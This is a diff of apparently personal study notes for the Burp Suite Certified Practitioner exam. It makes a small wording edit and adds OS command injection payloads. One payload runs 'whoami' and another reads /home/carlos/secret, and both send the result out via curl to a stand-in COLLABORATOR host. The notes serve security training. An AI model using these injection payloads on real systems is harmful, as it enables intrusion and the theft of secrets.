@@ -1,7 +1,7 @@
 
 # Burp Suite Certified Practitioner Exam Study  
 
->This is my study notes on the PortSwigger Academy [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) (BSCP) Exam topics. Go to [PortSwigger Academy](https://portswigger.net/web-security/all-materials) learning and research materials to get original detail. PortSwigger shared this [Retaking your exam](https://portswigger.net/web-security/certification/exam-hints-and-guidance/retaking-your-exam?tid=SNL7Q8oXE1mjUW1rSgswXSPIjhdLL5210Y-ogEuD1GZVp1w5spKfl5OJjAtj8AAC) advice. 
+>This is my study notes on the PortSwigger Academy [Burp Suite Certified Practitioner](https://portswigger.net/web-security/certification) (BSCP) Exam topics. Go to [PortSwigger Academy](https://portswigger.net/web-security/all-materials) learning and research materials to get original detail. PortSwigger have shared this [Retaking your exam](https://portswigger.net/web-security/certification/exam-hints-and-guidance/retaking-your-exam?tid=SNL7Q8oXE1mjUW1rSgswXSPIjhdLL5210Y-ogEuD1GZVp1w5spKfl5OJjAtj8AAC) advice.  
   
 **[FOOTHOLD](#foothold)**  
 [Content Discovery](#content-discovery)  
@@ -2872,7 +2872,11 @@ echo $cookie;
   
 ```bash
 email=carlos@exam.net||curl+`whoami`.COLLABORATOR.net||
+```  
+
 ```
+||$(curl $(cat /home/carlos/secret).COLLABORATOR.com)||
+```  
 
 ![OS command injection](images/os-command-inject.png)  
 
